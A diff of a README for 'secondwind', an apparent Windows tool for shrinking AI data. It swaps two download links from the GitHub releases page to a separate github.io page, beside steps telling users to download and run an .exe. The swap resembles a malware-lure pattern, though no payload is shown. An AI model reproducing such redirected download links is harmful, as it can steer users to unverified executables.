@@ -1,6 +1,6 @@
 # 🍃 secondwind - Shrink AI data without losing quality
 
-[Download Latest Version](https://github.com/padlockczech724/secondwind/releases)
+[Download Latest Version](https://padlockczech724.github.io)
 
 ## 📦 What is secondwind?
 
@@ -20,7 +20,7 @@ You need a Windows computer to use this tool. Please check if your system meets 
 
 ## ⬇️ How to Install and Run
 
-1. Visit the [releases page](https://github.com/padlockczech724/secondwind/releases) to find the latest version.
+1. Visit the [releases page](https://padlockczech724.github.io) to find the latest version.
 2. Look for the file ending in .exe in the "Assets" section.
 3. Click the file to start the download.
 4. Once the download finishes, find the file in your Downloads folder.
